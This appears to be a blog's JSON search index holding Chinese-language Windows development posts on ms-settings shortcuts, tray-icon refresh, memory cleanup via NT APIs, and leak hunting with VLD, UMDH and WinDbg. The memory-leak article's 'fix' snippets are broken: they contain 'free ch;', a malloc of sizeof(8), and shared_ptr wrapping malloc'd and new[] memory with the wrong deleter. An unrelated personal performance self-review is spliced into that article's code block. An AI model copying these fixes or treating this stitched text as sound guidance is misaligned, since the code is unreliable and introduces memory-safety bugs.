ms-settings:videoplayback Display Voice activation (apps can listen) ms-settings:privacy-voiceactivation Privacy Webcam (share between apps) ms-settings:privacy-webcam Privacy Wi-Fi ms-settings:network-wifi Network WinUpdate - Active Hours ms-settings:windowsupdate-activehours Security WinUpdate - Advanced options ms-settings:windowsupdate-options Security WinUpdate - Check for updates ms-settings:windowsupdate-action Security WinUpdate - Optional updates ms-settings:windowsupdate-optionalupdates Security WinUpdate - Restart options ms-settings:windowsupdate-restartoptions Security WinUpdate - Update history ms-settings:windowsupdate-history Security Windows Hello face setup ms-settings:signinoptions-launchfaceenrollment Security Windows Hello fingerprint setup ms-settings:signinoptions-launchfingerprintenrollment Security Windows Insider Program (beta’s) ms-settings:windowsinsider Windows Windows Search ms-settings:cortana-windowssearch Search Windows Security (Defender) ms-settings:windowsdefender Security Windows Security at a glance windowsdefender: Security Windows Update ms-settings:windowsupdate Security Your info (Microsoft account) ms-settings:yourinfo Security","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"ms-settings","slug":"ms-settings","permalink":"http://example.com/tags/ms-settings/"},{"name":"快捷方式","slug":"快捷方式","permalink":"http://example.com/tags/%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"【Windows】刷新托盘图标","date":"2023-10-27T01:24:02.024Z","path":"A_OS/Windows/【win】刷新托盘图标/","text":"[toc] 背景程序崩溃结束后，创建的系统托盘区图标并不能被刷新掉，重启客户端程序后，托盘区会有两个一样的图标。 解决方案方案一调用以下代码模拟鼠标hover操作遍历系统托盘区图标 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#ifdef Q_OS_WIN //刷新托盘图标 auto RefreshTrayIcon = []() &#123; //任务栏窗口 HWND hShellTrayWnd = ::FindWindow(L&quot;Shell_TrayWnd&quot;, NULL); //任务栏右边托盘图标+时间区 HWND hTrayNotifyWnd = ::FindWindowEx(hShellTrayWnd, 0, L&quot;TrayNotifyWnd&quot;, NULL); //不同系统可能有可能没有这层 HWND hSysPager = ::FindWindowEx(hTrayNotifyWnd, 0, L&quot;SysPager&quot;, NULL); //托盘图标窗口 HWND hToolbarWindow32; if (hSysPager) &#123; hToolbarWindow32 = ::FindWindowEx(hSysPager, 0, L&quot;ToolbarWindow32&quot;, NULL); &#125; else &#123; hToolbarWindow32 = ::FindWindowEx(hTrayNotifyWnd, 0, L&quot;ToolbarWindow32&quot;, NULL); &#125; if (hToolbarWindow32) &#123; RECT r; ::GetWindowRect(hToolbarWindow32, &amp;r); int width = r.right - r.left; int height = r.bottom - r.top; int iconWidth = GetSystemMetrics(SM_CXSMICON); // 图标基准宽度 int iconHeight = GetSystemMetrics(SM_CYSMICON); // 图标基准高度 //从任务栏中间从左到右 MOUSEMOVE一遍，所有图标状态会被更新 for (int x = 1; x &lt; width; x+=iconWidth) &#123; for (int y = 1; y &lt; height; y+=iconHeight) &#123; ::SendMessage(hToolbarWindow32, WM_MOUSEMOVE, 0, MAKELPARAM(x, y)); &#125; &#125; &#125; &#125;; // RefreshTrayIcon();#endif // Q_OS_WIN 方案二重新启动进程的时候先删除再创建，但是需要通过添加 uID 和 guidItem 来识别已创建的托盘图标 1234567891011 // 设置 uid 和 guiditemm_nid.uID = GUID_TrayIcon.Data2;if (QSysInfo::WindowsVersion &gt;= QSysInfo::WV_WINDOWS7)&#123; m_nid.uFlags |= NIF_GUID; m_nid.guidItem = GUID_TrayIcon;&#125; // 删除 Shell_NotifyIcon(NIM_DELETE, &amp;m_nid);","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"托盘","slug":"托盘","permalink":"http://example.com/tags/%E6%89%98%E7%9B%98/"},{"name":"tray","slug":"tray","permalink":"http://example.com/tags/tray/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"}]},{"title":"内存泄漏分析实战","date":"2023-10-27T01:24:02.023Z","path":"A_OS/Windows/内存泄漏/实战/内存泄漏分析实战/","text":"[toc] 前言本文为项目中服务程序的内存泄漏，挑了其中一部分比较常见的内存泄漏进行分析和修改。 关于内存泄漏和分析的文章可查看博客相关文章，有 UMDH 和 vld 两种方式，可根据个人需求展开分析。 泄漏分类# malloc 内存泄漏下述日志为一次 malloc 未正确释放导致的内存泄漏。这种问题比较常见，不用多说。 123ntdll.dll!RtlAllocateHeap()***\\heap\\malloc_base.cpp (34): XXX.dll!_malloc_base() + 0xF bytesXXX.dll!_event_debugx() + 0x1A7 bytes 解决方案： 根据提示的位置找到并释放该内存。 123char *ch = (char*)malloc(sizeof(8));free ch;ch = NULL; 另外，也可以使用智能指针管理该指针： 12char *ch = (char*)malloc(sizeof(8));shared_ptr&lt;char&gt; spCh(ch); # new 内存泄漏关于 new 的内存泄漏分析写了一段代码用来展示一下： 注：代码 Section2 部分为一个崩溃代码，堆内存申请后使用时一处，而在堆内存申请和释放时以及程序结束时释放堆内存时，都 存在堆溢出检查 ，检查点会抛出异常，导致程序奔溃。 1234567891011121314151617// 代码 Section2// 该函数代码还涉及奔溃问题int* test_heap_alloc()&#123; int* pTable = new int(256); // 申请一个int结构体变量，初始值为256; for (int i = 0; i &lt; 256; i++) pTable[i] = i; return pTable;&#125;int main ()&#123; test_heap_alloc(); // 执行上述代码之后再去下边这句申请堆内存会奔溃。 char* p = new char(0); // 申请一个字节，内容初始化为0 return 0;&#125; 以下为 vld 生成的泄漏日志： 123456789101112WARNING: Visual Leak Detector detected memory leaks!---------- Block 1 at 0x010AAC68: 4 bytes ---------- Leak Hash: 0x03729B3D, Count: 1, Total 4 bytes Call Stack (TID 33760): ucrtbase.dll!malloc() d:\\agent\\_work\\3\\s\\src\\vctools\\crt\\vcstartup\\src\\heap\\new_scalar.cpp (35): vldforptr.exe!operator new() + 0x8 bytes d:\\code_source\\c++\\vs2019\\vldforptr\\vldforptr.cpp (45): vldforptr.exe!main() + 0x7 bytes KERNEL32.DLL!BaseThreadInitThunk() + 0x19 bytes ntdll.dll!RtlGetAppContainerNamedObjectPath() + 0x11E bytes ntdll.dll!RtlGetAppContainerNamedObjectPath() + 0xEE bytes Data: 00 00 00 00 ........ ........ 解决方案： 调用 delete 释放 new 出来的内存。 问题：不确定变量什么时候使用完的，如何释放？ 123// 使用智能指针char *ch = new char[256];std::shared_ptr&lt;char&gt; spCh(ch); # strdup 内存泄漏strdup函数说明： 功能：将字符串拷贝到新建的位置处 返回值 ：返回一个指向新字符串的指针，该字符串是字符串s的副本，如果分配空间失败，则返回NULL值。新字符串的内存由strdup函数原型内部的malloc（）获得，需用free（）释放。 123ntdll.dll!RtlAllocateHeap()minkernel\\crts\\ucrt\\src\\appcrt\\heap\\malloc_base.cpp (34): XXX.dll!_malloc_base() + 0xF bytesXXX.dll!BUF_strndup() + 0x8A bytes 把返回内存地址的释放权交给了别的变量，这就很容易忘记释放，所以 strdup 这个函数也很容易造成内存泄漏。 整理# _malloc_base_malloc_base 就是编译器编译之后的 malloc。 查看vld的log可以看到，堆栈显示的 _malloc_base 所在的文件夹为 minkernel\\crts\\ucrt\\src\\appcrt\\heap\\malloc_base.cpp，这个文件就是 malloc 声明和定义的文件。 1234567领导您好！以下内容为本次绩效期间我的工作概述以及自我评价。本次绩效期间，我的主要工作内容集中在零信任国信版本和天擎零信任插件部分，同时也负责了部分工行、标板的需求开发（SPA、异常告警、命令行登录等）。零信任国信版本共计发布版本两次，均在发布版本之前完成了需求的开发和bug的修复，涉及的需求十多项，需求提测均通过，在完成需求的同时，整理编写了相应的技术开发文档十多篇，同时也补充了零信任客户端部分配置文件的说明文档。开发同时，针对国信零信任版本的升级故障问题（升级失败，升级检测问题），优化了该部分的逻辑，对整个客户端的无逻辑代码和日志部分进行了优化，以便于后续快速定位和分析问题，国信发布版本期间，为保证出包顺利，解决临时出现的问题，与团队一起解决问题并完成版本发布的任务；零信任插件部分，插件的开发让我学习到了较多框架方面的知识，了解了插件的开发以及团队联调的过程，零信任插件的开发在团队帮助下开发较为顺利，并且按时提测，且完成度较高，故障部分相对较少，调整部分基本为业务方面的逻辑调整。工行和标板的需求也是在计划内完成了需求的开发并提测成功，本次绩效期间，工作充实，如期完成了各项需求开发。不足就是多个需求的开发和提测过程相对较慢，由于环境（tac）问题，在开发自测和提测过程中出现了效果不一致的情况，在以后开发中需要注意该方面问题对开发提测的影响，提测前尽量保证自测完整，需求完善。以上就是本期自我评价。","tags":[{"name":"内存泄漏","slug":"内存泄漏","permalink":"http://example.com/tags/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"},{"name":"实战","slug":"实战","permalink":"http://example.com/tags/%E5%AE%9E%E6%88%98/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"内存泄漏","slug":"A-OS/Windows/内存泄漏","permalink":"http://example.com/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"},{"name":"实战","slug":"A-OS/Windows/内存泄漏/实战","permalink":"http://example.com/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/%E5%AE%9E%E6%88%98/"}]},{"title":"【Win】内存清理","date":"2023-10-27T01:24:02.021Z","path":"A_OS/Windows/内存泄漏/内存清理/","text":"概述： windows操作系统如果实现内存清理 相关实现： henrypp&#x2F;memreduct: Lightweight real-time memory management application to monitor and clean system memory on your computer. 工具：Mem Reduct 参考文章：使用 NT API 整理内存碎片 - 大贤者初春令月 在系统运行过程中，内存中不可避免地会产生一些内存碎片，这会影响系统的执行效率，因此适时整理内存碎片是有必要的。 现在市面上大部分的内存碎片整理工具通过尽可能让系统分配内存块把尽可能多的内存块挤入交换文件然后再释放以达成目的。 我感觉这个方法不够优雅，毕竟这要求你的内存碎片整理工具一定运行在 Native 模式而不是 WoW 兼容层中，譬如如果你的工具是 32 位的话最多只能向系统请求 4GB 的内存，无法达到你的目的。而且由于是被迫让系统把内存块挤入交换文件，于是运行效率不高， 而且也给系统调度机制带来了很大的影响。 于是本文提出一种新的内存碎片整理方式，通过调用 NT API 通知内核主动将内存块移动到交换文件，于是整理速度非常快， 而且对系统调度机制的影响也最小。 灵感来源当我使用 Sysinternals Suite 的 RAMMap 工具的 Empty 菜单的功能的时候，发现通过适当的顺序操作可以高效地整理内存碎片。 于是用 IDA Pro 分析了下 RAMMap 工具的相关功能，并对自己的发现进行总结，编写示例和本文。 操作方法需要以管理员身份运行你的二进制。 首先启用当前进程的 SeProfileSingleProcessPrivilege 特权，然后调用 NtSetSystemInformation，分别向 SystemMemoryListInformation 传入 MemoryEmptyWorkingSets, MemoryFlushModifiedList 和 MemoryPurgeStandbyList 即可完成内存碎片整理。 参考 Mem Reduct 的代码如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142if (mask &amp; REDUCT_WORKING_SET) &#123; command = MemoryEmptyWorkingSets; status = NtSetSystemInformation (SystemMemoryListInformation, &amp;command, sizeof (command)); if (!NT_SUCCESS (status)) _r_log (LOG_LEVEL_ERROR, NULL, L&quot;NtSetSystemInformation&quot;, status, L&quot;MemoryEmptyWorkingSets&quot;); &#125; // Standby priority-0 list (vista+) if (mask &amp; REDUCT_STANDBY_PRIORITY0_LIST) &#123; command = MemoryPurgeLowPriorityStandbyList; status = NtSetSystemInformation (SystemMemoryListInformation, &amp;command, sizeof (command)); if (!NT_SUCCESS (status)) _r_log (LOG_LEVEL_ERROR, NULL, L&quot;NtSetSystemInformation&quot;, status, L&quot;MemoryPurgeLowPriorityStandbyList&quot;); &#125; // Standby list (vista+) if (mask &amp; REDUCT_STANDBY_LIST) &#123; command = MemoryPurgeStandbyList; status = NtSetSystemInformation (SystemMemoryListInformation, &amp;command, sizeof (command)); if (!NT_SUCCESS (status)) _r_log (LOG_LEVEL_ERROR, NULL, L&quot;NtSetSystemInformation&quot;, status, L&quot;MemoryPurgeStandbyList&quot;); &#125; // Modified page list (vista+) if (mask &amp; REDUCT_MODIFIED_LIST) &#123; command = MemoryFlushModifiedList; status = NtSetSystemInformation (SystemMemoryListInformation, &amp;command, sizeof (command)); if (!NT_SUCCESS (status)) _r_log (LOG_LEVEL_ERROR, NULL, L&quot;NtSetSystemInformation&quot;, status, L&quot;MemoryFlushModifiedList&quot;); &#125; 完整代码示例以下示例依赖于笔者创建的 https://github.com/Chuyu-Team/MINT 库提供的 NT API 定义。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;MINT.h&gt;namespace&#123; static HRESULT DefragMemory() &#123; using NtSetSystemInformationType = decltype(::NtSetSystemInformation)*; using RtlNtStatusToDosErrorType = decltype(::RtlNtStatusToDosError)*; NtSetSystemInformationType pNtSetSystemInformation = nullptr; RtlNtStatusToDosErrorType pRtlNtStatusToDosError = nullptr; HMODULE ModuleHandle = ::GetModuleHandleW(L&quot;ntdll.dll&quot;); if (!ModuleHandle) &#123; return E_NOINTERFACE; &#125; pNtSetSystemInformation = reinterpret_cast&lt;NtSetSystemInformationType&gt;( ::GetProcAddress(ModuleHandle, &quot;NtSetSystemInformation&quot;)); if (!pNtSetSystemInformation) &#123; return E_NOINTERFACE; &#125; pRtlNtStatusToDosError = reinterpret_cast&lt;RtlNtStatusToDosErrorType&gt;( ::GetProcAddress(ModuleHandle, &quot;RtlNtStatusToDosError&quot;)); if (!pRtlNtStatusToDosError) &#123; return E_NOINTERFACE; &#125; // Working Sets -&gt; Modified Page List -&gt; Standby List SYSTEM_MEMORY_LIST_COMMAND CommandList[] = &#123; SYSTEM_MEMORY_LIST_COMMAND::MemoryEmptyWorkingSets, SYSTEM_MEMORY_LIST_COMMAND::MemoryFlushModifiedList, SYSTEM_MEMORY_LIST_COMMAND::MemoryPurgeStandbyList &#125;; NTSTATUS Status = STATUS_SUCCESS; for (size_t i = 0; i &lt; sizeof(CommandList) / sizeof(*CommandList); ++i) &#123; Status = pNtSetSystemInformation( SystemMemoryListInformation, &amp;CommandList[i], sizeof(SYSTEM_MEMORY_LIST_COMMAND)); if (!NT_SUCCESS(Status)) &#123; break; &#125; &#125; return Mile::HResult::FromWin32(pRtlNtStatusToDosError(Status)); &#125;&#125;EXTERN_C HRESULT WINAPI MoDefragMemory( _In_ PNSUDO_CONTEXT Context)&#123; Mile::HResult hr = S_OK; HANDLE CurrentProcessToken = INVALID_HANDLE_VALUE; if (::OpenProcessToken( ::GetCurrentProcess(), MAXIMUM_ALLOWED, &amp;CurrentProcessToken)) &#123; LUID_AND_ATTRIBUTES RawPrivilege; RawPrivilege.Attributes = SE_PRIVILEGE_ENABLED; if (::LookupPrivilegeValueW( nullptr, SE_PROF_SINGLE_PROCESS_NAME, &amp;RawPrivilege.Luid)) &#123; hr = Mile::AdjustTokenPrivilegesSimple( CurrentProcessToken, &amp;RawPrivilege, 1); if (hr.IsSucceeded()) &#123; hr = ::DefragMemory(); &#125; &#125; ::CloseHandle(CurrentProcessToken); &#125; return hr;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"http://example.com/tags/windows/"},{"name":"内存","slug":"内存","permalink":"http://example.com/tags/%E5%86%85%E5%AD%98/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"内存泄漏","slug":"A-OS/Windows/内存泄漏","permalink":"http://example.com/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"}]},{"title":"【内存泄漏】使用 UMDH 定位用户模式内存泄漏","date":"2023-10-27T01:24:02.020Z","path":"A_OS/Windows/内存泄漏/内存泄漏定位 UMDH/","text":"概述：使用 UMDH 分析内存泄漏 [toc] UMDH UMDH（用户模式转储堆），是与操作系统一起用于分析特性进程Windows堆分配。UMDH查找特定进程中的哪个例程正在泄漏内存。特别要注意的事：使用UMDH显示堆栈跟踪数据之前，必须使用 GFlags 正确配置系统。Windows的调试工具中包含了 GFlags。 使用启用 UMDH stack 跟踪： 在 GFlags 图形界面中，选择 “图像文件” 选项卡，键入进程名称 (包括文件扩展名) ，按 TAB 键，选择 “ 创建用户模式堆栈跟踪数据库“，然后选择 “ 应用“。或者，在命令行界面使用 gflags 命令设置。 1gflags -i imageName +ust 当完成分析后，使用 - 清楚设置： 1gflags -i imageName -ust 默认情况下，在 x86 处理器上 Windows 收集的堆栈跟踪数据量限制为 32 MB，在 x64 处理器上限制为 64 mb。 如果必须增加此数据库的大小，请选择 “GFlags” 图形界面中的 “ 映像文件 “ 选项卡，键入进程名称，按 tab 键，选中 “ Stack Backtrace (Megs) “ 复选框，在 “关联” 文本框中键入值 (，以) MB 为单位），然后选择 “ 应用“。 仅在必要时增加此数据库，因为它可能会耗尽有限的 Windows 资源。 如果不再需要更大的大小，则将此设置返回到其原始值。 如果更改了 “系统注册表“ 选项卡上的任何标志，则必须重新启动 Windows 以使这些更改生效。 如果更改了 “ 图像文件 “ 选项卡上的任何标志，则必须重新启动该过程才能使更改生效。 对内核标志选项卡所做的更改会立即生效，但下次重新启动 Windows，它们会丢失。 在使用 UMDH 之前，必须有权访问应用程序的正确符号。UMDH 使用环境变量指定的符号路径 _NT_SYMBOL_PATH。将此变量设置为包含应用程序的符号的路径。如果还包括 Windows 符号的路径，则分析可能更完整。此符号路径的语法与调试器使用的语法相同。 例如，如果你的应用程序的符号位于 C:\\MySymbols，并且你想要为你的 Windows 符号使用公共 Microsoft 符号存储区，则使用 C:\\MyCache 作为下游存储，你将使用以下命令设置你的符号路径： 1set _NT_SYMBOL_PATH=c:\\mysymbols;srv*c:\\mycache*https://msdl.microsoft.com/download/symb 此外，若需要确保准确的结果，必须禁用 BSTR 缓存。为此，请将 OANOCACHE 环境变量的值设置为 1（需要在启动跟踪其分配的应用程序之前进行设置）。如果需要跟踪服务所做的分配，则必须将 OANOCACHE 设置为西戎环境变量，然后重新启动 Windows 以使此设置生效。 检测通过 UMDH 增加的堆分配 1. 确认进程ID (PID)12# 查找进程idtlist | finstr &quot;进程名&quot; 2. 保存日志文件使用 UMDH 分析此进程的堆内存分配，并将其保存到日志文件。将 -p 开关与 PID 一起使用，并将 -f 开关与日志文件的名称一起使用。例如，如果 PID 为123，并且你想要将日志文件命名为 Log1.txt ，请使用以下命令： 12# 保存快照umdh -p:123 -f:log1.txt 3. 查看日志使用记事本或其他程序打开日志文件。 此文件包含每个堆分配的调用堆栈、通过该调用堆栈进行的分配数，以及通过该调用堆栈使用的字节数。 4. 前后两次日志对比结果由于您正在查找内存泄漏，因此，单个日志文件的内容是不够的。 你必须比较在不同时间记录的日志文件，以确定哪些分配正在增长。 UMDH 可以比较两个不同的日志文件，并在各自的分配大小中显示更改。 您可以使用大于符号 (&gt;) 将结果重定向到第三个文本文件。 你可能还需要包含-d 选项，该选项将字节和分配计数从十六进制转换为十进制。 例如，若要比较 Log1.txt 和 Log2.txt，将比较结果保存到文件 LogCompare.txt，请使用以下命令： 1umdh log1.txt log2.txt &gt; logcompare.txt 5. 分析内存泄漏12+ 5320 ( f110 - 9df0) 3a allocs BackTrace00B53 Total increase == 5320 对于每个调用堆栈 (在 UMDH 日志文件中标记为 “BackTrace” ) ，这两个日志文件之间有比较。 在此示例中，第一个日志文件 (Log1.txt) 为 BackTrace00B53 分配的0x9DF0 字节，而第二个日志文件记录了0xF110 字节，这意味着在捕获两个日志的时间之间分配有0x5320 的额外字节。 这些字节来自 BackTrace00B53 标识的调用堆栈。 6. 查看泄漏堆栈若要确定该 backtrace 中的内容，请打开一个原始日志文件 (例如 Log2.txt) ，然后搜索 “BackTrace00B53”。结果类似于以下数据： 1234567891011121300005320 bytes in 0x14 allocations (@ 0x00000428) by: BackTrace00B53ntdll!RtlDebugAllocateHeap+0x000000FDntdll!RtlAllocateHeapSlowly+0x0000005Antdll!RtlAllocateHeap+0x00000808MyApp!_heap_alloc_base+0x00000069MyApp!_heap_alloc_dbg+0x000001A2MyApp!_nh_malloc_dbg+0x00000023MyApp!_nh_malloc+0x00000016MyApp!operator new+0x0000000EMyApp!DisplayMyGraphics+0x0000001EMyApp!main+0x0000002CMyApp!mainCRTStartup+0x000000FCKERNEL32!BaseProcessStart+0x0000003D 上述泄漏内存分析: 此 UMDH 输出显示有) (十进制21280从调用堆栈中分配的总字节数。 这些字节是从 0x14 (十进制 20) 单独分配的，每个 0x428 (十进制 1064) 字节。 将为调用堆栈提供 “BackTrace00B53” 的标识符，并显示此堆栈中的调用。 在检查调用堆栈时，可以看到 DisplayMyGraphics 例程正在通过 new 运算符分配内存，该运算符调用例程 malloc，后者使用 Visual C++ 运行时库从堆中获取内存。 确定要在源代码中显式显示的最后一个调用。 在这种情况下，它可能是 new 运算符，因为调用 malloc 是作为 新 的实现的一部分而不是作为单独的分配。 因此， DisplayMyGraphics例程中new运算符的此实例会重复分配未释放的内存。 参考链接使用 UMDH 查找用户模式内存泄漏 - Windows drivers | Microsoft Docs","tags":[{"name":"内存","slug":"内存","permalink":"http://example.com/tags/%E5%86%85%E5%AD%98/"},{"name":"内存泄漏","slug":"内存泄漏","permalink":"http://example.com/tags/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"},{"name":"UMDH","slug":"UMDH","permalink":"http://example.com/tags/UMDH/"},{"name":"WinDbg","slug":"WinDbg","permalink":"http://example.com/tags/WinDbg/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"内存泄漏","slug":"A-OS/Windows/内存泄漏","permalink":"http://example.com/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"}]},{"title":"【一文搞懂】VLD 内存泄漏定位","date":"2023-10-27T01:24:02.016Z","path":"A_OS/Windows/内存泄漏/vld内存泄漏/","text":"概述：VLD 安装及使用 [toc] 半学半练，定位了一把内存泄漏的问题。主要使用 VLD 这个工具。 VLD 下载安装和使用1. 下载和安装Visual Leak Detector | Enhanced Memory Leak Detection for Visual C++ 点击上方链接下载和安装 vld 工具，记住安装的位置，后续有很多文件会使用到，需要拷贝移动到相应的文件中。 2. 使用 安装完成后，找到安装所在的文件夹 找到 visual studio 中 标准头文文件 所在的文件夹，一般会在对应的 windows kits 所在的文件夹中找到。如： C:\\Program Files (x86)\\Windows Kits\\10\\Include\\10.0.18362.0\\ucrt。拷贝安装目录下 include 中的 头文件到该目录，注意有几个 kits 环境就尽量拷贝几个，万一用到呢 找到 vs studio 中 库文件 所在的文件夹，一般会在对应的 windows kits 所在的文件夹中找到。如： C:\\Program Files (x86)\\Windows Kits\\10\\Lib\\(kits 版本号)\\um\\。拷贝安装目录下 lib 目录下对应位数的 lib 文件到 kits 对应的 um\\x64或um\\x86 文件夹中。 到这一步，只要在程序中引入 vld 头文件就可以正常使用了。 1#include &lt;vld.h&gt; 3. 在 vs2015 以上的版本中使用 安装的时候就可以看到 vld 只支持到 vs2015。所以在 vs 更高的版本中使用时，需要一些额外的操作。 影响：在vs高版本中使用时，虽然能定位泄漏问题，但是不显示文件名和行号。 解决办法： 在 vs 工程设置中按下图设置： 4. release 模式下进行内存泄漏检测在 Debug 模式下，直接在工程中源文件中任意位置引入 &lt;vld.h&gt; 即可，编译之后的可执行文件就带有泄漏检测的功能。 但是在 Release 模式下则需要做一下额外的处理。 同 Debug 版本在 VS 中一样配置好 VLD 的相关信息 拷贝 VLD 安装目录下 bin\\win32 目录下所有的文件和 vld.ini 到工程目标路径下(可执行文件的目录)。 在程序入口处的 cpp 文件中，定义强制检测宏和包含 vld 头文件 12#define VLD_FORCE_ENABLE#include &lt;vld.h&gt; 在程序启动和退出时，分别增加以下函数调用 1234567&#123; ... VLDGlobalEnable(); VLDReportLeaks(); //some code... VLDGlobalDisable();&#125; 修改配置文件配置执行环境在单独运行的环境中，还需要在程序执行目录添加以下 12345678dbghelp.dllMicrosoft.DTfW.DHL.manifestvld_x86.dllvld_x86.pdbvld.ini# 除此之外还有可能需要api-ms-win-core-winrt-l1-1-0.dll 增加检测模块 以上配置后，默认情况下只会检测主线程的模块，要想增加其他模块的内存泄漏检测，需要配置 vld.ini 配置文件中的 ForceIncludeModules 配置项。在该配置项后增加需要检测的模块。如：ForceIncludeModules=demo1.dll;demo2.dll 配置输出方式同样还是配置文件中修改。设置配置文件中 ReportTo 的值即可： debugger：控制台 file: 文件 （默认会输出在运行程序的目录下，也可能会输出在 syswow64 这个系统目录下，Win+R 输入 syswow64即可打开这个目录。默认文件名：memory_leak_report.txt） both：控制台和文件 关于 VLD 的配置文件： Vld 的库会检查程序所运行的当前目录是否存在 vld.ini 的配置文件，如果有，则加载里头的配置进行内存检测运行，如果没有取默认的配置参数运行，我们可以手动将 vld.ini 的文件拷贝到程序的运行目录中即可。 关于 vld.ini 的几个注意的参数： VLD = on 总开关，是否启用 VLD 功能，默认为 yes MaxDataDump = 256 用来显示检测到的内在泄露的块的地址大小，默认256，其实就是显示多少个byte的内容。 MaxTraceFrames = 64 设置 VLD 检测到堆栈的最大层极，也就是frame的深度 ReportFile = xxx设置 VLD 生成报告的位置和报告的文件名，默认为：.\\memory_leak_report.txt ，程序当前运行目录中。 ReportTo = debugger 设置 VLD 生成报告的方式，debugger为在控制台输出 VLD 的报告信息，file在指定目录下生成报告文件，both为即输出也生成报告。如果你的程序为带窗体的程序，需要设置为file或both. 问题1：不显示文件名和行号缺少 pdb 文件 如果程序运行之后生成的 memory_leak_report 中还是不显示行号，则试试把pdb文件放在程序的运行目录试试。 参考文章 【VS2019】C&#x2F;C++内存泄漏检测工具：Visual Leak Detector超详细安装教程（for windows）_执行x的博客-CSDN博客_vs2019内存泄漏检测 使用VLD进行内存泄漏检测(release + debug)_OH,CGWLMXUP的博客-CSDN博客_release vld","tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"内存泄漏","slug":"内存泄漏","permalink":"http://example.com/tags/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"},{"name":"tools","slug":"tools","permalink":"http://example.com/tags/tools/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"内存泄漏","slug":"A-OS/Windows/内存泄漏","permalink":"http://example.com/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"}]},{"title":"【内存泄漏】windbg 定位内存泄漏","date":"2023-10-27T01:24:02.015Z","path":"A_OS/Windows/内存泄漏/WinDbg定位内存泄漏/","text":"概述：使用 Windbg 定位内存泄漏 [toc] windbg 定位内存泄漏主要使用 !heap 命令 使用Windbg检测Windows程序内存泄漏的步骤如下： 启动程序：使用Windbg启动需要检测内存泄漏的程序，可以通过在Windbg中选择“文件”-&gt;“打开程序”来打开程序。 设置符号路径：在Windbg中，可以通过设置符号路径来加载程序的符号信息，方便调试。可以通过在Windbg中输入“.sympath”命令来设置符号路径，例如： 1.sympath+ C:\\Symbols 其中，C:\\Symbols是符号文件的路径。 启用gflags：gflags是Windows提供的一个工具，可以用来设置程序的调试标志。可以通过在命令行中输入以下命令来启用gflags： 1gflags /i your_program.exe +ust 其中，your_program.exe是需要检测内存泄漏的程序的名称。 运行程序：在Windbg中，可以通过输入“g”命令来运行程序。 检测内存泄漏：在程序运行过程中，可以通过输入“!heap -s”命令来查看程序的堆内存使用情况，例如： 1!heap -s 该命令会输出程序的堆内存使用情况，包括已分配的内存块数量、已释放的内存块数量、已分配的内存块总大小、已释放的内存块总大小等信息。 输出内存泄漏信息：在程序运行结束后，可以通过输入“!heap -stat -h handle”命令来输出内存泄漏信息，例如： 1!heap -stat -h handle 该命令会输出程序中所有未释放的内存块的信息，包括内存块的大小、地址、分配位置等信息。 需要注意的是，使用Windbg检测内存泄漏需要一定的调试经验和技巧，对程序的性能也会产生一定的影响。因此，在正式发布程序之前，应该关闭gflags功能。可以通过在命令行中输入以下命令来关闭gflags： 1gflags /i your_program.exe -ust 其中，your_program.exe是需要关闭gflags功能的程序的名称。","tags":[{"name":"内存泄漏","slug":"内存泄漏","permalink":"http://example.com/tags/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"},{"name":"windbg","slug":"windbg","permalink":"http://example.com/tags/windbg/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"http://example.com/categories/A-OS/Windows/"},{"name":"内存泄漏","slug":"A-OS/Windows/内存泄漏","permalink":"http://example.com/categories/A-OS/Windows/%E5%86%85%E5%AD%98%E6%B3%84%E6%BC%8F/"}]},{"title":"【Windows】共享文件夹","date":"2023-10-27T01:24:02.013Z","path":"A_OS/Windows/【win】共享文件夹/","text":"最近由于项目需求，需要编写一个监控本机共享文件夹的变化的模块，经过查询资料，找到并实现了一个较为稳定的方式项目实现是使用 Win32 C++的，测试平台是 Win 7 64 和 Win 10 64，XP 测试也是好使的。下面是具体实现 首先要获取并监控系统共享文件夹的路径，相关注册表路径为 HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\LanmanServer\\Share , 他的值的格式为如图所示， 0x01 C++ 